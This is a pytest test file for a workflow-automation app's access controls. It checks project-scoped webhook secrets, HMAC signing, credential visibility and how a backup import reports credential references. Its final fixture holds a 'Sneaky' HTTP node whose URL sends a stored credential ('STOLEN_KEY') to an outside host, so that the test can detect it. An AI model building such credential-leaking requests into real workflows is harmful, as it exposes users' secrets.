import hashlib
import hmac as hmac_lib

import pytest
from fastapi.testclient import TestClient

from app import main
from conftest import edge, make_flow, node


@pytest.fixture(autouse=True)
def _clean(clean_state):
    yield
    with main.conn() as db:
        db.execute("DELETE FROM project_members")
        db.execute("DELETE FROM workflows WHERE id != ?", ("demo-workflow",))
        db.execute("DELETE FROM projects")


def project(client, name):
    return client.post("/api/projects", json={"name": name}).json()["id"]


def hook(client, pid, **cfg):
    wid = make_flow(client, [node("w", "webhook", sample="{}", **cfg), node("o", "output")], [edge("w", "o")])
    if pid: client.put(f"/api/projects/assign/{wid}", json={"project_id": pid})
    assert client.post(f"/api/workflows/{wid}/active", json={"active": True}).status_code == 200
    return f"/api/hooks/{client.get(f'/api/workflows/{wid}').json()['webhook_token']}"


def test_a_webhook_cannot_use_another_projects_credential_as_its_secret(client, anon):
    a, b = project(client, "Team A"), project(client, "Team B")
    client.put("/api/credentials/ASECRET", json={"value": "team-a-only-secret", "project_id": a})
    inside = hook(client, a, auth_type="header", auth_header="X-Key", auth_credential="ASECRET")
    outside = hook(client, b, auth_type="header", auth_header="X-Key", auth_credential="ASECRET")
    assert anon.post(inside, json={}, headers={"X-Key": "team-a-only-secret"}).status_code == 200
    assert anon.post(outside, json={}, headers={"X-Key": "team-a-only-secret"}).status_code == 401  # B cannot use A's secret, even to test guesses against it


def test_signed_webhooks_follow_the_same_rule(client, anon):
    a, b = project(client, "Team A"), project(client, "Team B")
    client.put("/api/credentials/SIGN", json={"value": "team-a-signing-key", "project_id": a})
    body = b"{}"
    sig = hmac_lib.new(b"team-a-signing-key", body, hashlib.sha256).hexdigest()
    ok = hook(client, a, auth_type="hmac", auth_credential="SIGN")
    no = hook(client, b, auth_type="hmac", auth_credential="SIGN")
    assert anon.post(ok, content=body, headers={"X-Signature-256": sig, "Content-Type": "application/json"}).status_code == 200
    assert anon.post(no, content=body, headers={"X-Signature-256": sig, "Content-Type": "application/json"}).status_code == 401


def test_shared_credentials_still_work_for_every_webhook(client, anon):
    a = project(client, "Team A")
    client.put("/api/credentials/SHAREDHOOK", json={"value": "shared-hook-secret"})
    url = hook(client, a, auth_type="header", auth_header="X-Key", auth_credential="SHAREDHOOK")
    assert anon.post(url, json={}, headers={"X-Key": "shared-hook-secret"}).status_code == 200


def test_people_outside_a_project_do_not_see_its_credentials(client):
    a, b = project(client, "Team A"), project(client, "Team B")
    client.put("/api/credentials/ONLYA", json={"value": "team-a-secret-value", "project_id": a})
    client.put("/api/credentials/ONLYB", json={"value": "team-b-secret-value", "project_id": b})
    client.put("/api/credentials/EVERYONE", json={"value": "shared-secret-value"})
    member = client.post("/api/users", json={"username": "scope-member", "password": "long-enough-pw", "role": "editor"}).json()
    users = client.get("/api/users").json()
    uid = next(u["id"] for u in users if u["username"] == "scope-member")
    client.put(f"/api/projects/{a}", json={"user_ids": [uid]})
    c = TestClient(main.app)
    assert c.post("/api/auth/login", json={"username": "scope-member", "password": "long-enough-pw"}).status_code == 200
    names = {x["name"] for x in c.get("/api/credentials").json()}
    assert names == {"ONLYA", "EVERYONE"} and member is not None
    assert {x["name"] for x in client.get("/api/credentials").json()} >= {"ONLYA", "ONLYB", "EVERYONE"}  # the owner sees all
    client.delete(f"/api/users/{uid}")


def test_an_import_reports_which_credentials_a_workflow_refers_to(client):
    nodes = [{"id": "t", "type": "trigger", "position": {"x": 0, "y": 0}, "data": {"label": "t"}},
             {"id": "h", "type": "http", "position": {"x": 0, "y": 0}, "data": {"label": "h", "url": "https://x.example.com/?k={{cred.STOLEN_KEY}}", "auth_credential": "OTHER_KEY", "credential": "THIRD"}},
             {"id": "n", "type": "note", "position": {"x": 0, "y": 0}, "data": {"label": "n"}}]
    pack = {"format": "flowpilot-backup", "workflows": [{"name": "Sneaky", "nodes": nodes, "edges": []}, {"name": "Plain", "nodes": nodes[:1], "edges": []}]}
    res = client.post("/api/backup/restore", json=pack).json()
    by = {c["name"]: c["uses_credentials"] for c in res["created"]}
    assert by["Sneaky"] == ["OTHER_KEY", "STOLEN_KEY", "THIRD"] and by["Plain"] == []
